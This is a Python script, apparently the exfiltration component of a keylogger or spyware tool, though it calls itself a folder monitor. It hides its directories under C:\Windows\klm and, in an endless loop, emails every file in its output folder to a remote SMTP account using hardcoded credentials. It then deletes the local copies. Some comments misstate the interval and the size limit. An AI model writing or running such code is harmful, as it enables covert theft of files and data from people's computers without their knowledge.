import os
import smtplib
import time
import logging
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Set up logging
log_directory = "C:\\Windows\\klm\\logs"
output_directory = "C:\\Windows\\klm\\output"
os.makedirs(log_directory, exist_ok=True)
os.makedirs(output_directory, exist_ok=True)
logging.basicConfig(filename=os.path.join(log_directory, 'folder_monitor.log'),
                    level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

EMAIL_ADDRESS = "071bfafc4dde91"
EMAIL_PASSWORD = "9918ecc6a25877"
CHECK_INTERVAL = 900  # Check every hour
MAX_ATTACHMENT_SIZE = 5 * 1024 * 1024  # 6 MB

class FolderMonitor:
    def __init__(self, directory, email, password):
        self.directory = directory
        self.email = email
        self.password = password
        logging.info("FolderMonitor initialized")

    def send_mail(self, email, password, subject, message, attachment_paths=None):
        try:
            total_sent = 0
            current_msg = MIMEMultipart()
            current_msg['From'] = email
            current_msg['To'] = email
            current_msg['Subject'] = subject
            current_msg.attach(MIMEText(message, 'plain'))

            if attachment_paths:
                attachment_paths.sort(key=os.path.getsize, reverse=True)  # Start with largest file to manage space

                for attachment_path in attachment_paths:
                    if os.path.exists(attachment_path):
                        file_size = os.path.getsize(attachment_path)
                        # Check if adding this file would exceed the limit
                        if total_sent + file_size > MAX_ATTACHMENT_SIZE:
                            # Send current message before adding more attachments
                            self.smtp_send(email, password, current_msg)
                            total_sent = 0  # Reset counter after sending
                            current_msg = MIMEMultipart()  # Start new message
                            current_msg['From'] = email
                            current_msg['To'] = email
                            current_msg['Subject'] = subject
                            current_msg.attach(MIMEText(message, 'plain'))

                        with open(attachment_path, "rb") as attachment:
                            part = MIMEBase('application', 'octet-stream')
                            part.set_payload(attachment.read())
                            encoders.encode_base64(part)
                            part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
                            current_msg.attach(part)
                            total_sent += file_size

                if total_sent > 0:  # There's still content to send
                    self.smtp_send(email, password, current_msg)

                # Only delete files if they were added to a successful email
                for attachment_path in attachment_paths:
                    if os.path.exists(attachment_path):
                        os.remove(attachment_path)
                        logging.info(f"Deleted file: {attachment_path}")

        except Exception as e:
            logging.error(f"Failed to send email: {e}")

    def smtp_send(self, email, password, msg):
        with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
            server.login(email, password)
            server.sendmail(email, email, msg.as_string())
        logging.info("Email sent successfully with attachments.")

    def check_folder(self):
        while True:
            files = [os.path.join(self.directory, f) for f in os.listdir(self.directory) if os.path.isfile(os.path.join(self.directory, f))]
            if files:
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                subject = f"Files Report - {timestamp}"
                self.send_mail(self.email, self.password, subject, "Please find the attached files.", files)
            time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    folder_monitor = FolderMonitor(output_directory, EMAIL_ADDRESS, EMAIL_PASSWORD)
    folder_monitor.check_folder()
